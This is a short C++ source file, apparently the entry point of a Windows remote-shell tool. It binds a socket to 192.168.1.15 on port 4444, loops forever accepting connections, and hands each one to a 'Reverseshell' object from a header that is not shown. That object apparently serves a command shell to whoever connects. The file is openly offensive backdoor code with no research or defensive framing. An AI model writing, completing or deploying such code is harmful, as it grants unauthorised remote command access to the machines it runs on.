#include <iostream>
#include "windows.h"

#include "socket.h"
#include "ReverseShell.h"
  
int main(int argc, char** argv) {
	 
	SOCKADDR_IN sin; 
	Socket * sock;
	Reverseshell * shell;
	   
	memset( &sin, 0, sizeof(sin) ); 
	
	sin.sin_family 		= AF_INET;
	sin.sin_port   		= htons(4444);
	sin.sin_addr.s_addr = inet_addr("192.168.1.15");
	 
	sock = new Socket( &sin );
  	shell= new Reverseshell( );
   	
  	if( sock->valid( ) ){
  		
  		sock->Bind();
  		sock->Listen(1);
  		for(;;){
  		 	
  			Socket * clts;
  			SOCKADDR_IN csin = {0};
  			
  			if( ( clts = sock->Accept( &csin ) )->valid( ) ){
  				shell->get( clts );
  				sock->Clean( );
			}	
		}
		 
  		sock->Close( );
	}
	
	ExitProcess(0);

	return 0;
}
